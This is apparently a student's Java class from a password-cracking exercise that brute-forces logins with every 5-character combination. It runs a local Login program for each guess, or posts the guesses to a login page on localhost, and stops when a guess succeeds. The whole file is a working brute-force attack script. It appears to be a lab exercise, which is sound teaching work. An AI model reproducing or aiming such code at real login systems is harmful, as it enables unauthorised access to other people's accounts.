
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import utils.HttpUtils;
import utils.PasswordUtils;
import java.util.Arrays;

public class AttaqueBruteForce extends Attaque {

    @Override
    public void initier(String cible, String login) {
        switch (cible) {
            case "local":
                try {
                    String characters =  PasswordUtils.generateCharacters(true, false, false, false);
                    String[] passwordList = PasswordUtils.generatePasswordCombinations(characters, 5);

                    for (int i = 0; i < passwordList.length; i++) {
                        String password = passwordList[i];

                        String[] command = {"java", "-cp", "C:\\Users\\Abdoulaye\\Desktop\\dp\\passwdcracker\\out", "Login", login, password};
                        Process process = new ProcessBuilder(command).start();
                        BufferedReader resultat = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String output = resultat.readLine();
                        System.out.println("Tentative avec mot de passe: " + password + " -> " + output);
                        
                        int exitCode = process.waitFor();
                        if (exitCode == 0) {
                            System.out.println("=================================");
                            System.out.println("Mot de passe trouve: " + password);
                            System.out.println("=================================");
                            break;
                        }
                    }
                } catch (IOException | InterruptedException e) {
                    System.err.format("IOException: %s%n", e);
                }
                break;

            case "remote":
                String uri = "http://localhost/app/login.php";
                HttpClient client = HttpUtils.createHttpClient();
                try {
                     String characters = PasswordUtils.generateCharacters(true, false, false, false);
                    String[] passwordList = PasswordUtils.generatePasswordCombinations(characters, 5);

                    for (int i = 0; i < passwordList.length; i++) {
                        String password = passwordList[i];
                        HttpRequest request = HttpUtils.createPostRequest(uri, login, password);
                        HttpResponse<String> response = client.send(request, BodyHandlers.ofString());

                        System.out.print("Tentative avec mot de passe: " + password + " -> ");
                        System.out.println("Statut: " + response.statusCode());

                        if (response.statusCode() == 200) {
                            System.out.println("=================================");
                            System.out.println("Mot de passe trouve: " + password);
                            System.out.println("=================================");
                            break;
                        }
                    }
                } catch (Exception e) {
                    System.err.format("Exception: %s%n", e);
                }
                break;

            default:
                System.out.println("Type de cible non reconnu. Veuillez spécifier 'local' ou 'remote'.");
                break;
        }

    }

    private String generateNextPassword() {

        throw new UnsupportedOperationException("Not supported yet.");
    }
}
